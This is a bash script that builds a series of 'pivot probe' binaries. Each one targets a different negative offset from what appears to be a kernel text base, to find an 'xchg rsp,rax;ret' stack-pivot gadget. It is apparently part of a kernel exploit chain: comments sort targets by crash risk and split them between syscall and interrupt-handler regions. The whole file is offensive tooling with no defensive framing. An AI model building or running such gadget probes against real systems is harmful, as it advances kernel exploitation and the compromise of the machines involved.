#!/bin/bash
set -e
OUTDIR="bins"
mkdir -p "$OUTDIR"

build() {
    local name="$1" mode="$2" offset="$3"
    make clean -s 2>/dev/null || true
    make PROBE_MODE="$mode" TARGET_OFFSET="$offset" -s 2>&1 | grep -v warning || true
    cp gadget_probe.bin "$OUTDIR/${name}.bin"
    echo "  Built $name.bin"
}

echo "=== Building pivot probes (mode 1) ==="
echo "Testing for xchg rsp,rax;ret (48 94 C3) at entry-3"
echo ""

# Top targets sorted by gap size (safest first = largest preceding function)
# Skipping targets 1,2,3,5 (huge gaps = unknown territory, panic risk)

echo "--- Syscall/ops region (safest - normal function code) ---"
build "pivot_gap108720"   1 "-0x972833"   # entry=ktext+0x28d7d0
build "pivot_gap8552"     1 "-0x968bbb"   # entry=ktext+0x297448
build "pivot_gap5048"     1 "-0x96681b"   # entry=ktext+0x2997e8
build "pivot_gap2872"     1 "-0x96f1d3"   # entry=ktext+0x290e30
build "pivot_gap2256"     1 "-0x96ffbb"   # entry=ktext+0x290048
build "pivot_gap2024"     1 "-0x9680bb"   # entry=ktext+0x297f48
build "pivot_gap1912"     1 "-0x965ccb"   # entry=ktext+0x29a338
build "pivot_gap1856a"    1 "-0x96ea3b"   # entry=ktext+0x2915c8
build "pivot_gap1856b"    1 "-0x962b53"   # entry=ktext+0x29d4b0
build "pivot_gap1800"     1 "-0x96213b"   # entry=ktext+0x29dec8
build "pivot_gap1704"     1 "-0x96c25b"   # entry=ktext+0x293da8
build "pivot_gap1672"     1 "-0x965643"   # entry=ktext+0x29a9c0
build "pivot_gap1552"     1 "-0x964c6b"   # entry=ktext+0x29b398
build "pivot_gap1504"     1 "-0x971003"   # entry=ktext+0x28f000
build "pivot_gap1152"     1 "-0x96af4b"   # entry=ktext+0x2950b8
build "pivot_gap1048"     1 "-0x963c9b"   # entry=ktext+0x29c368
build "pivot_gap1032"     1 "-0x96b6a3"   # entry=ktext+0x294960
build "pivot_gap1024"     1 "-0x96e12b"   # entry=ktext+0x291ed8

echo ""
echo "--- IDT handler region (interrupt handlers, generally safe) ---"
build "pivot_idt_gap7632"  1 "-0xb19293"   # entry=ktext+0x0e6d70
build "pivot_idt_gap4416"  1 "-0xb141d3"   # entry=ktext+0x0ebe30
build "pivot_idt_gap3584"  1 "-0xb133d3"   # entry=ktext+0x0ecc30
build "pivot_idt_gap3264"  1 "-0xb185d3"   # entry=ktext+0x0e7a30
build "pivot_idt_gap2896"  1 "-0xb15803"   # entry=ktext+0x0ea800
build "pivot_idt_gap1968"  1 "-0xb122c3"   # entry=ktext+0x0edd40
build "pivot_idt_gap1920"  1 "-0xb12a73"   # entry=ktext+0x0ed590
build "pivot_idt_gap1888"  1 "-0xb17813"   # entry=ktext+0x0e87f0

echo ""
echo "=== Done! ==="
ls "$OUTDIR"/pivot_*.bin | wc -l
echo "pivot probe binaries built"
